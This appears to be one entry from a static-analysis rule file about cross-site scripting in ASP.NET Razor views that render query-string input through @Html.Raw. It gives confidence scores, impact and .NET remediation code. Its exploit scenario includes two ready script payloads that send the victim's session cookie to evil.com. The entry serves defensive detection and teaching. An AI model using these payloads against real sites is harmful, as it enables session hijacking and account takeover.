  exploit_scenario:
    attack_example: 'A search results page displays the search term using @Html.Raw(ViewBag.SearchTerm) where SearchTerm comes
      from the query string. An attacker crafts a URL: https://example.com/search?q=<script>document.location=''https://evil.com/steal?c=''+document.cookie</script>
      When a victim clicks this link, their session cookie is sent to the attacker, enabling session hijacking.

      '
    example_payload: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
    attacker_objective: 'Execute arbitrary JavaScript in the victim''s browser to steal session tokens, capture keystrokes,
      redirect users to phishing pages, deface the application, or perform actions on behalf of the authenticated user.

      '
  confidence_factors:
    pattern_strength: 0.9
    context_match: 0.85
    proximity_to_user_input: 0.88
    sanitization_absence: 0.8
  impact: 'Cross-site scripting enabling session hijacking, credential theft,

    and malicious code execution in user browsers. Stored XSS variants

    affect all users who view the compromised content. May lead to

    account takeover, data exfiltration, and phishing attacks.

    '
  remediation: "**Razor Auto-Encoding (ASP.NET Core Default):**\n  @* Razor automatically HTML-encodes @ expressions *@\n\
    \  <p>Search results for: @Model.SearchTerm</p>\n  @* NEVER use @Html.Raw with user input *@\n\n**Explicit Encoding in\
    \ Controllers (ASP.NET Core):**\n  using System.Text.Encodings.Web;\n\n  public class SearchController : Controller\n\
    \  {\n      private readonly HtmlEncoder _htmlEncoder;\n\n      public SearchController(HtmlEncoder htmlEncoder)\n   \
    \   {\n          _htmlEncoder = htmlEncoder;\n      }\n\n      public IActionResult Results(string query)\n      {\n \
    \         ViewBag.SafeQuery = _htmlEncoder.Encode(query);\n          return View();\n      }\n  }\n\n**Content Security\
    \ Policy (.NET 8):**\n  // In Program.cs\n  app.Use(async (context, next) =>\n  {\n      context.Response.Headers.Append(\n\
    \          \"Content-Security-Policy\",\n          \"default-src 'self'; script-src 'self'; style-src 'self'\");\n   \
    \   await next();\n  });\n\n  // Or use NWebsec middleware\n  app.UseXContentTypeOptions();\n  app.UseXXssProtection(options\
    \ => options.EnabledWithBlockMode());\n  app.UseCsp(options => options\n      .DefaultSources(s => s.Self())\n      .ScriptSources(s\
    \ => s.Self()));\n\n**Entity Framework Core (Stored XSS Prevention):**\n  // Always encode data before storing if it will\
    \ be rendered as HTML\n  var comment = new Comment\n  {\n      Text = HtmlEncoder.Default.Encode(userInput),\n      AuthorId\
    \ = currentUserId\n  };\n  await _context.Comments.AddAsync(comment);\n\n**JavaScript Context Encoding (.NET 8):**\n \
    \ @using System.Text.Encodings.Web\n  @inject JavaScriptEncoder JsEncoder\n  <script>\n      var userName = '@JsEncoder.Encode(Model.UserName)';\n\
    \  </script>\n\n**Anti-Forgery Tokens (ASP.NET Core):**\n  // Global registration in Program.cs\n  builder.Services.AddControllersWithViews(options\
    \ =>\n  {\n      options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());\n  });\n"
  references:
